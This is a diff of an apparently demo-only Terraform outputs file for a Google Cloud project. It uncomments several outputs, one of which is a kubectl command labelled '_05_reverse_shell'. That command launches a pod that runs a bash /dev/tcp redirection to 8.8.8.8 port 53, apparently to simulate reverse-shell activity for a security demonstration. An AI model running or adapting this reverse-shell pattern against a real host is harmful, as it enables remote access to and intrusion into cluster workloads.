@@ -18,7 +18,7 @@
 ## NOTE: This provides PoC demo environment for various use cases ##
 ##  This is not built for production workload ##
 
-/*
+
 output "_01_core_project_infra_mod_id" {
   value = google_project.demo_project.project_id
 }
@@ -42,4 +42,4 @@ output "_05_reverse_shell" {
   value = "kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
 }
 
-*/
+
